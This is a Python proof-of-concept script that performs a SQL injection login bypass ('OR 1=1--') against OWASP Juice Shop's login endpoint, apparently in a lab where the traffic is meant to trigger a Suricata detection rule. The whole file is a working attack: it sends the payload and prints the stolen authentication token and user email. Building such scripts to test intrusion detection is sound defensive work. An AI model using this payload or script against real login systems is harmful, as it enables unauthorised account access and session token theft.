#!/usr/bin/env python3
"""SQL Injection - Login Bypass via ' OR 1=1-- against OWASP Juice Shop."""

import requests
import json
import sys

TARGET = "http://juice-shop:3000"

def main():
    print("[*] SQL Injection - Login Bypass PoC")
    print(f"[*] Target: {TARGET}")
    print()

    url = f"{TARGET}/rest/user/login"
    payload = {
        "email": "' OR 1=1--",
        "password": "anything"
    }

    print(f"[*] Sending POST to {url}")
    print(f"[*] Payload: {json.dumps(payload)}")
    print()

    try:
        resp = requests.post(url, json=payload, timeout=10)
        print(f"[*] Status Code: {resp.status_code}")
        print(f"[*] Response:")

        try:
            data = resp.json()
            print(json.dumps(data, indent=2))

            if resp.status_code == 200 and "authentication" in data:
                token = data["authentication"].get("token", "N/A")
                print()
                print(f"[+] SUCCESS! Login bypassed!")
                print(f"[+] Auth Token: {token[:50]}...")
                print(f"[+] User Email: {data['authentication'].get('umail', 'N/A')}")
            else:
                print()
                print("[-] Login bypass did not return a token (Juice Shop may have different behavior)")
                print("[*] The SQLi payload was still sent and should trigger Suricata alerts")

        except json.JSONDecodeError:
            print(resp.text[:500])

    except requests.ConnectionError:
        print("[-] ERROR: Could not connect to Juice Shop")
        print("[!] Make sure juice-shop container is running")
        sys.exit(1)
    except Exception as e:
        print(f"[-] ERROR: {e}")
        sys.exit(1)

    print()
    print("[*] Attack complete. Check Suricata alerts for SID 100001.")

if __name__ == "__main__":
    main()
